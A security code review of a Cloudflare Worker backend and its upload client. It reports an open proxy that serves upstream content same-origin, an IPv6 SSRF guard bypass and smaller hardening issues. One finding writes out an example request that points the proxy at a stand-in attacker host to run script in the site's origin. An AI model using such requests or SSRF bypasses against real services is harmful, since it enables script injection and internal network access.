# infra/ Code Review

Review of the Cloudflare Worker backend, D1/R2 data layer, and client API code under `infra/`. Findings are grouped by severity. Each was verified against the actual source; the false positives surfaced during review are listed at the end so they don't get re-raised.

Overall the code is in good shape: SQL is fully parameterized, ownership checks are enforced in the queries themselves, OAuth uses PKCE + a signed handshake cookie, cookie flags are correct, and the cache layer degrades gracefully. The findings below are mostly hardening and robustness, with two worth prioritizing (the proxy same-origin content-type and the IPv6 SSRF gap).

---

## Medium

### 1. Proxy serves arbitrary upstream content same-origin without a type guard

**File:** [infra/worker/routes/proxy.ts:29-35](infra/worker/routes/proxy.ts:29)

`GET /api/proxy?url=` is public and unauthenticated, forwards any public `https` URL, and returns the bytes with the **upstream's** `Content-Type` verbatim and no `X-Content-Type-Options: nosniff`. An attacker can point it at a URL that returns `text/html` with embedded script, and it renders in the `nexteditor.dev` origin (`GET /api/proxy?url=https://evil.example/x.html`). This is the same-origin script-execution risk the upload route deliberately guards against (it excludes `.svg` and the media route sets `nosniff`), but the proxy has neither defense.

Recommended: add `X-Content-Type-Options: nosniff` — but be aware it only closes the sniffing sub-case. A response the upstream _explicitly_ labels `Content-Type: text/html` still renders and runs its scripts on top-level navigation to `/api/proxy?url=…`, `nosniff` present or not (nosniff stops the browser overriding a declared type, not honoring one). To actually prevent in-origin rendering, also send `Content-Disposition: attachment` or override the response `Content-Type` to a safe value. The 24h `Cache-Control: public` also makes the proxy usable as a free bandwidth/anonymizing relay — consider a host allow-list or auth if that matters.

### 2. IPv6 SSRF checks never match — private IPv6 literals are not blocked

**File:** `src/shared/proxy.ts` (the SSRF core imported by [infra/worker/routes/proxy.ts:3](infra/worker/routes/proxy.ts:3); flagged here because it is the security boundary of the infra proxy route)

`isPubliclyRoutableHost` compares `url.hostname` against `"::1"`, `"fe80:"`, `"fc"`, `"fd"`. But `URL.hostname` returns IPv6 literals **with brackets** — verified: `new URL("https://[::1]/").hostname === "[::1]"`. So `host === "::1"` and `host.startsWith("fe80:")` are always false, and loopback / link-local / unique-local IPv6 targets pass the guard. IPv4 checks are unaffected.

This matters most for the shared module's other consumer, the Vite dev-server Node middleware, where `fetch` to internal addresses is genuinely reachable (on Workers the platform limits internal routing). Fix by stripping brackets before the comparisons, e.g. `host.replace(/^\[|\]$/g, "")`.

Separately, the same block **over-blocks legitimate domains**: the IPv6 prefix checks `host.startsWith("fc")` / `host.startsWith("fd")` run for every non-IPv4 host, so ordinary names like `fc2.com` are rejected as unique-local IPv6. Gate those prefix checks to actual IPv6 literals (bracketed hosts) instead of applying them to all hostnames — stripping brackets alone enables the literal checks but doesn't fix this over-block.

### 3. `id_token` payload decode can throw an unhandled error

**File:** [infra/worker/auth/google.ts:69](infra/worker/auth/google.ts:69), [infra/worker/auth/google.ts:115](infra/worker/auth/google.ts:115)

`decodeIdTokenPayload` does `JSON.parse(base64UrlDecodeToString(...))` with no guard (line 69), and the callback parses the handshake cookie the same way (line 115). A malformed payload throws out of the handler and surfaces as a generic 500 instead of the route's own `502 "Google's response had no id_token"`-style error. The token is fetched server-to-server so this is unlikely, but the OAuth callback is the one place worth being defensive. Wrap both parses and return a 502/400. (Skipping JWT signature re-verification here is fine and correctly justified in the comment — the token comes straight from Google's token endpoint.)

---

## Low

### 4. Lesson `ne` / `thumbnail` paths are trusted from the request body

**File:** [infra/worker/routes/lessons.ts:127-128](infra/worker/routes/lessons.ts:127), [infra/worker/routes/lessons.ts:171](infra/worker/routes/lessons.ts:171)

`POST /api/lessons` and `PATCH /api/lessons/:id` accept any string for `ne`/`thumbnail` and store `media/<value>` without checking it points at an object this user actually uploaded (the upload route enforces ownership, but nothing links the stored path back to it). A signed-in user can set their lesson's media to another lesson's public key. But published-lesson media is already public and the write is still ownership-gated, so the impact is cosmetic content spoofing — displaying someone else's public bytes under your own lesson — with no confidentiality or integrity loss. Hence Low. Consider validating the value matches `lessons/<id>/<allowed-filename>` for the lesson's own id.

### 5. Username regex admits 1-char names despite the "3-32" contract

**File:** [infra/worker/auth/session.ts:15](infra/worker/auth/session.ts:15)

`USERNAME_PATTERN = /^[a-z0-9](?:[a-z0-9-]{1,30}[a-z0-9])?$/` matches a single character (optional group absent), so a 1-char username passes even though the comment and the 400 message both say "3-32". (2 chars is correctly impossible; the gap is only length 1.) Add a length floor or `{2,}` in the trailing class if the 3-char minimum is intended.

### 6. `handleUpload`'s 401 branch can strand the user on a rejected `saveResumeIntent`

**File:** [infra/client/upload/UploadLessonModal.tsx:155-161](infra/client/upload/UploadLessonModal.tsx:155), and `handleSignIn` [UploadLessonModal.tsx:76-79](infra/client/upload/UploadLessonModal.tsx:76)

Inside the `catch`, `await saveResumeIntent(...)` precedes the `window.location.href` redirect with no guard. If the IndexedDB write rejects, the redirect never runs and the rejection is unhandled. `handleSignIn` has the same shape and is invoked as `void handleSignIn()`, swallowing the rejection entirely. Redirect in a `finally`, or `try/catch` the intent save so a failed save still navigates. (The subagent tagged this High; downgraded — it only triggers on an IndexedDB failure and the worst case is a stuck form, not data loss or a security issue.)

### 7. `handleCopyLink` timer isn't cleaned up on unmount

**File:** [infra/client/upload/UploadLessonModal.tsx:178](infra/client/upload/UploadLessonModal.tsx:178)

`setTimeout(() => setCopied(false), 2000)` has no cleanup; if the modal unmounts within 2s the callback still fires `setCopied` on a gone component. Harmless no-op in React 18+, but move it to an effect keyed on `copied` for correctness.

### 8. Playlist `updated_at` bump is not atomic with the membership write

**File:** [infra/db/playlistQueries.ts:236-248](infra/db/playlistQueries.ts:236) (add), [infra/db/playlistQueries.ts:264-272](infra/db/playlistQueries.ts:264) (remove)

The `INSERT`/`DELETE` into `playlist_lessons` and the follow-up `UPDATE playlists SET updated_at` run as two separate statements. A failure between them leaves `updated_at` stale (membership is still correct). Low impact; wrapping the pair in `db.batch()` makes it atomic. (Position `MAX(position)+1` is fine — D1 serializes writes.)

### 9. Required auth secrets are undocumented in wrangler.toml

**File:** [infra/wrangler.toml:15-23](infra/wrangler.toml:15)

Only the optional Upstash secrets are documented. `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`, and `SESSION_SECRET` are declared non-optional in `env.d.ts` but there's no `wrangler secret put` note; a fresh deploy without them fails only at runtime on the first auth request. Add the same comment block the Upstash secrets have.

### 10. Content-Length is the only upload size gate

**File:** [infra/worker/routes/uploads.ts:54-66](infra/worker/routes/uploads.ts:54)

The size limit is enforced purely from the `Content-Length` header; there's no post-stream byte assertion. On Workers this is largely safe — a fixed-length body read is bounded to the declared length and chunked bodies (no Content-Length) are rejected with 411 — so this is a hardening note, not an exploitable bypass. If you ever want a hard guarantee, count bytes through a `TransformStream` and abort past `limit`.

---

## Nits

- **Redundant blob-URL revocation** — [UploadLessonModal.tsx:104-107](infra/client/upload/UploadLessonModal.tsx:104) and the effect at [70-74](infra/client/upload/UploadLessonModal.tsx:70) both revoke the same URL. Idempotent, not a bug; just overlapping ownership.
- **OAuth `state` compared with `!==`** — [google.ts:116](infra/worker/auth/google.ts:116). Not constant-time, but `state` is a 24-byte CSRF nonce, not a secret; timing is not a practical vector. No change needed.
- **Handshake payload type-asserted, not validated** — [google.ts:115](infra/worker/auth/google.ts:115). The cookie is signed and self-set, so field validation adds little; covered by fixing #3's parse guard.
- **Upload `:id` param is uncharted into the R2 key** — [uploads.ts:26-63](infra/worker/routes/uploads.ts:26). The route's `:id` has no charset constraint, so it's partly request-controlled in the key `lessons/${id}/${filename}`. Harmless today (R2 keys are literal — no `..` traversal, and a non-existent id just skips the ownership row), but constraining `:id` to the expected UUID charset would remove the sharp edge.

---

## Verified clean (checked, no issue)

- **SQL injection** — every query in `db/queries.ts` / `db/playlistQueries.ts` uses bound params; dynamic `SET` clauses use hardcoded column literals.
- **LIKE-wildcard injection** — `escapeLikePattern` escapes `\ % _` and the queries use `ESCAPE '\'` ([db/queries.ts:5-8](infra/db/queries.ts:5), `searchUsers`/`searchPublishedLessons`).
- **Ownership / IDOR** — mutations resolve the user via session and enforce `owner_id` inside the query; not-found and not-owner both return an indistinguishable 404 (see lessons/playlists routes). Upload route rejects writing under another owner's existing lesson id.
- **`.dev.vars`** — gitignored and not tracked; only `.dev.vars.example` is committed.
- **Media route** — sets `nosniff` + `immutable` cache; range handling verified; public-by-unguessable-key tradeoff is documented and intentional.
- **Cache layer** — `cached()` degrades to the loader on any Redis error; no floating promises.

### Dropped false positive

- "Unused `Env` import in cache.ts" (raised by a review pass) is **incorrect** — `Env` is used in `getCache(env: Env)` at [cache.ts:23](infra/worker/cache.ts:23).
